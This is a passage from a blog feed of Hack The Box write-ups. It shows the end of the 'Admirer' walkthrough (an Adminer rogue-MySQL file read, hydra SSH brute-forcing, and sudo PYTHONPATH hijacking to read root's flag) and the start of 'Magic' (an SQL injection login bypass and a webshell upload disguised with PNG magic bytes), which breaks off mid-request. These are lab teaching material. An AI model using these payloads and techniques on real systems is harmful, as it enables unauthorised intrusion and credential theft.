&lt;span class="code-line"&gt;fgJr6q#S\W:$P&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[FTP account]&lt;/span&gt;
&lt;span class="code-line"&gt;ftpuser&lt;/span&gt;
&lt;span class="code-line"&gt;%n?4Wz}R$tTF7&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[Wordpress account]&lt;/span&gt;
&lt;span class="code-line"&gt;admin&lt;/span&gt;
&lt;span class="code-line"&gt;w0rdpr3ss01!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="back-to-the-ftp"&gt;Back to the FTP&lt;/h2&gt;
&lt;p&gt;We connect to the FTP account using the creds. This allow us to get a SQL dump
(nothing interesting in it) and an archive of the web site. This archive give
show the existence of an interesting directory &lt;code&gt;utility-scripts&lt;/code&gt;. It also give
use credentials for a MySQL database in the &lt;code&gt;db_connect.php&lt;/code&gt; file.
The comment at the end of the file &lt;code&gt;// TODO: Finish implementing this or find a better open source alternative&lt;/code&gt;
is also an hint for the next part.&lt;/p&gt;
&lt;p&gt;&lt;img alt="FTP page" src="/media/2020.09/admirer_03.png"&gt;&lt;/p&gt;
&lt;h2 id="back-to-the-web"&gt;Back to the web&lt;/h2&gt;
&lt;p&gt;We use &lt;code&gt;dirb&lt;/code&gt; on the &lt;code&gt;utility-scripts&lt;/code&gt; directory. As we know that the
application is using php we add the &lt;code&gt;.php&lt;/code&gt; extension. The tool discover the page
&lt;code&gt;adminer.php&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_admirer$ dirb http://10.10.10.187/utility-scripts/  /usr/share/wordlists/dirb/big.txt -X .php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Tue May  5 05:55:58 2020&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.187/utility-scripts/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt&lt;/span&gt;
&lt;span class="code-line"&gt;EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 20458&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.187/utility-scripts/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.187/utility-scripts/adminer.php (CODE:200|SIZE:4295)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="adminer"&gt;Adminer&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://www.adminer.org/"&gt;Adminer&lt;/a&gt; is a tools to manage your database directly
from your browser. It is a &lt;a href="https://www.phpmyadmin.net/"&gt;phpmyadmin&lt;/a&gt;
alternative.&lt;/p&gt;
&lt;p&gt;Obviously we land on a login page. The previously found credentials doesn't work.
But looking at the page, we see that the used version is "4.6.2" and that the
last version is "4.7.6".&lt;/p&gt;
&lt;p&gt;&lt;img alt="adminer page" src="/media/2020.09/admirer_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We Google for "adminer 4.6.2 exploit" and found an article about a
&lt;a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool"&gt;serious vulnerability in adminer tool&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We just need a &lt;a href="https://github.com/allyshka/Rogue-MySql-Server"&gt;Rogue MySql Server&lt;/a&gt;.
We launch it and start getting some files. We try &lt;code&gt;db_connect.php&lt;/code&gt; but the file
was obviously replace by &lt;code&gt;adminer.php&lt;/code&gt;. We can retrieve &lt;code&gt;adminier.php&lt;/code&gt; just to
be sure that our exploit is working. Then we just retrieve &lt;code&gt;../index.php&lt;/code&gt; which
contain the new creds for the database.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/Rogue-MySql-Server$ php roguemysql.php&lt;/span&gt;
&lt;span class="code-line"&gt;Enter filename to get [db_connect.php] &amp;gt; ../index.php&lt;/span&gt;
&lt;span class="code-line"&gt;[.] Waiting for connection on 0.0.0.0:3306&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Connection from 10.10.10.187:47566 - greet... auth ok... some shit ok... want file...&lt;/span&gt;
&lt;span class="code-line"&gt;[+] ../index.php from 10.10.10.187:47566:&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!DOCTYPE HTML&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!--&lt;/span&gt;
&lt;span class="code-line"&gt;        Multiverse by HTML5 UP&lt;/span&gt;
&lt;span class="code-line"&gt;        html5up.net | @ajlkn&lt;/span&gt;
&lt;span class="code-line"&gt;        Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)&lt;/span&gt;
&lt;span class="code-line"&gt;--&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;title&amp;gt;Admirer&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;meta charset=&amp;quot;utf-8&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1, user-scalable=no&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;assets/css/main.css&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;noscript&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;assets/css/noscript.css&amp;quot; /&amp;gt;&amp;lt;/noscript&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;body class=&amp;quot;is-preload&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;!-- Wrapper --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                        &amp;lt;div id=&amp;quot;wrapper&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                &amp;lt;!-- Header --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                        &amp;lt;header id=&amp;quot;header&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                                &amp;lt;h1&amp;gt;&amp;lt;a href=&amp;quot;index.html&amp;quot;&amp;gt;&amp;lt;strong&amp;gt;Admirer&amp;lt;/strong&amp;gt; of skills and visuals&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                                &amp;lt;nav&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                                        &amp;lt;ul&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                                                &amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;#footer&amp;quot; class=&amp;quot;icon solid fa-info-circle&amp;quot;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                                        &amp;lt;/ul&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                                &amp;lt;/nav&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                        &amp;lt;/header&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                &amp;lt;!-- Main --&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                        &amp;lt;div id=&amp;quot;main&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                                        &amp;lt;?php&lt;/span&gt;
&lt;span class="code-line"&gt;                        $servername = &amp;quot;localhost&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;                        $username = &amp;quot;waldo&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;                        $password = &amp;quot;&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;                        $dbname = &amp;quot;admirerdb&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect to the local database with adminer but there is nothing
interesting there.&lt;/p&gt;
&lt;p&gt;I have the habit to create two files &lt;code&gt;user&lt;/code&gt; and &lt;code&gt;passwd&lt;/code&gt; containing the looted
data. We use &lt;code&gt;hydra&lt;/code&gt; to test the gather creds against the ssh service. The last
password found is a valid SSH password for the &lt;code&gt;waldo&lt;/code&gt; user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ hydra -L user -P passwd ssh://10.10.10.187&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-05 05:22:06&lt;/span&gt;
&lt;span class="code-line"&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;/span&gt;
&lt;span class="code-line"&gt;[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries (l:11/p:6), ~5 tries per task&lt;/span&gt;
&lt;span class="code-line"&gt;[DATA] attacking ssh://10.10.10.187:22/&lt;/span&gt;
&lt;span class="code-line"&gt;[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7&lt;/span&gt;
&lt;span class="code-line"&gt;[22][ssh] host: 10.10.10.187   login: waldo   password: &amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;1 of 1 target successfully completed, 2 valid passwords found&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-05 05:22:17&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then connect to ssh and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_admirer/loot/html$ ssh waldo@10.10.10.187&lt;/span&gt;
&lt;span class="code-line"&gt;waldo@10.10.10.187&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;waldo@admirer:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;fea0c3468144ce6091631cfbfb6c81eb&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="way-to-root"&gt;Way to root&lt;/h1&gt;
&lt;p&gt;With our ssh connection with start to enumerate the box. The first thing we
notice is that we have the sudo permission to execute
&lt;code&gt;/opt/scripts/admin_tasks.sh&lt;/code&gt; with the &lt;code&gt;SETENV&lt;/code&gt; flag. Which means that our
environmental variable will be preserved.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;waldo@admirer:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;[sudo] password for waldo:&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for waldo on admirer:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User waldo may run the following commands on admirer:&lt;/span&gt;
&lt;span class="code-line"&gt;    (ALL) SETENV: /opt/scripts/admin_tasks.sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When looking at the script we see a few interesting blocks.&lt;/p&gt;
&lt;p&gt;The first interesting part is the &lt;code&gt;backup_shadow&lt;/code&gt; function. I tried some race
condition between the moment the file is backuped and not yet &lt;code&gt;chown&lt;/code&gt; to root.
But that is not working.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;backup_shadow&lt;span class="o"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EUID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;then&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Backing up /etc/shadow to /var/backups/shadow.bak...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        /bin/cp /etc/shadow /var/backups/shadow.bak&lt;/span&gt;
&lt;span class="code-line"&gt;        /bin/chown root:shadow /var/backups/shadow.bak&lt;/span&gt;
&lt;span class="code-line"&gt;        /bin/chmod &lt;span class="m"&gt;600&lt;/span&gt; /var/backups/shadow.bak&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Done.&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Insufficient privileges to perform the selected operation.&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;fi&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The next one is the &lt;code&gt;backup_web&lt;/code&gt; function as this call an external python
script.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;backup_web&lt;span class="o"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EUID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -eq &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;then&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Running backup script in the background, it might take a while...&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        /opt/scripts/backup.py &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Insufficient privileges to perform the selected operation.&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;fi&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The python script import the &lt;code&gt;make_archive&lt;/code&gt; function from &lt;code&gt;shutil&lt;/code&gt;. And then
create a &lt;code&gt;tar.gz&lt;/code&gt; archive from &lt;code&gt;/var/www/hml&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/python3&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;make_archive&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;src&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/var/www/html/&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# old ftp directory, not used anymore&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#dst = &amp;#39;/srv/ftp/html&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/var/backups/html&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;make_archive&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;gztar&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we can export our environmental variable to &lt;code&gt;sudo&lt;/code&gt;, we can rewrote the
&lt;code&gt;shutil&lt;/code&gt; module to execute the code we want. We wrote a specific &lt;code&gt;shutil.py&lt;/code&gt; script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    :::text&lt;/span&gt;
&lt;span class="code-line"&gt;    def make_archive(a,b,c):&lt;/span&gt;
&lt;span class="code-line"&gt;        print(&amp;#39;ok&amp;#39;)&lt;/span&gt;
&lt;span class="code-line"&gt;        with open(&amp;#39;/root/root.txt&amp;#39;) as f:&lt;/span&gt;
&lt;span class="code-line"&gt;            with open(&amp;#39;/tmp/plop/flag.txt&amp;#39;, &amp;#39;w&amp;#39;) as g:&lt;/span&gt;
&lt;span class="code-line"&gt;                g.write(f.read())&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And run the web backup with specifying our &lt;code&gt;PYTHONPATH&lt;/code&gt; environment variable.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;waldo@admirer:/tmp/plop$ sudo PYTHONPATH=/tmp/plop /opt/scripts/admin_tasks.sh 6&lt;/span&gt;
&lt;span class="code-line"&gt;Running backup script in the background, it might take a while...&lt;/span&gt;
&lt;span class="code-line"&gt;waldo@admirer:/tmp/plop$ ok&lt;/span&gt;
&lt;span class="code-line"&gt;cat flag.txt&lt;/span&gt;
&lt;span class="code-line"&gt;6bd44137e00395497fefe44684913599&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;The box was a combination of simple techniques. As the exposed surface was
really small (FTP, SSH and HTTP) there was not a lot of rabbit hole during
exploration. I am a bit mad that the "exploit" for adminer was not in
&lt;code&gt;searchsploit&lt;/code&gt; as I lost some time before putting the search into Google.&lt;/p&gt;
&lt;p&gt;The root part was quit simple if you know already know the issue.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="adminer"></category><category term="Linux"></category><category term="sudo"></category></entry><entry><title>HTB: Magic</title><link href="https://maggick.fr/2020/08/htb-magic.html" rel="alternate"></link><published>2020-08-29T08:50:00+02:00</published><updated>2020-08-29T08:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-29:/2020/08/htb-magic.html</id><summary type="html">&lt;p&gt;&lt;img alt="Magic card" class="align-left" src="/media/2020.08/magic_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/241"&gt;Magic&lt;/a&gt; publish by
&lt;a href="https://www.hackthebox.eu/home/users/profile/31190"&gt;TRX&lt;/a&gt; on April 18 2020.
This box is classified as a medium machine but is quit easy.
It involves a basic SQL injection, a magic file upload and a SUID binary.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.08/magic_card.png" alt="Magic card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/241"&gt;Magic&lt;/a&gt; publish by
&lt;a href="https://www.hackthebox.eu/home/users/profile/31190"&gt;TRX&lt;/a&gt; on April 18 2020.
This box is classified as a medium machine but is quit easy.
It involves a basic SQL injection, a magic file upload and a SUID binary.&lt;/p&gt;


&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Apr 20 11:14:29 2020 as: nmap -p- -oN nmap 10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.016s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon Apr 20 11:14:42 2020 -- 1 IP address (1 host up) scanned in 12.63 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="ssh"&gt;SSH&lt;/h1&gt;
&lt;p&gt;The SSH service accept only public key authentication. Therefore we won't be
able to use any password found to connect to the SSH service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh toto@10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;toto@10.10.10.185: Permission denied (publickey).&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="web"&gt;Web&lt;/h1&gt;
&lt;p&gt;The website expose some picture gallery.&lt;/p&gt;
&lt;p&gt;&lt;img alt="main page" src="/media/2020.08/magic_01.png"&gt;&lt;/p&gt;
&lt;p&gt;The website announce that we need to login to upload new picture.&lt;/p&gt;
&lt;p&gt;&lt;img alt="login form" src="/media/2020.08/magic_02.png"&gt;&lt;/p&gt;
&lt;p&gt;Some mechanism forbid us to put space in our username and password. We fire up
Burp and edit the request using the &lt;code&gt;Intercept&lt;/code&gt; function so that our post
request look like the following&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /login.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;username=aa&amp;#39; or 1=1 -- &amp;amp;password=a&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We are then logged in and we can upload picture using the application.&lt;/p&gt;
&lt;p&gt;&lt;img alt="upload form" src="/media/2020.08/magic_03.png"&gt;&lt;/p&gt;
&lt;p&gt;Obviously we want to upload some PHP file for instance
&lt;code&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt;. We intercept the request with
Burp and change the Content-Type to &lt;code&gt;image/png&lt;/code&gt; and the image name to
&lt;code&gt;simple-backdoor.php.png&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Our request is blocked and the application send us the following message
&lt;code&gt;&amp;lt;script&amp;gt;alert('What are you trying to do there?')&amp;lt;/script&amp;gt;&amp;lt;!DOCTYPE HTML&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;That where the name of the box is relevant. We need to add the
PNG &lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures"&gt;magic number&lt;/a&gt; to
our file.&lt;/p&gt;
&lt;p&gt;Still using Burp we add &lt;code&gt;aaaaaaaa&lt;/code&gt; at the begging of our file.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Burp request with aaaaaaaa" src="/media/2020.08/magic_04.png"&gt;&lt;/p&gt;
&lt;p&gt;Using the Raw editor in Burp we replace our &lt;code&gt;a&lt;/code&gt; (&lt;code&gt;61&lt;/code&gt;) by the PNG's magic number
&lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Burp request with PNG's magic number" src="/media/2020.08/magic_05.png"&gt;&lt;/p&gt;
&lt;p&gt;Our request now looks like the following (I was forced to clean the requests
with the magic numbers as it broke the RSS/Atom xml).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /upload.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: multipart/form-data; boundary=---------------------------1971341748341881315972996739&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 692&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=gl7e03c4vb6ejee40tgeobjhfh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------------------1971341748341881315972996739&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Disposition: form-data; name=&amp;quot;image&amp;quot;; filename=&amp;quot;simple-backdoor2.php.png&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: image/png&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
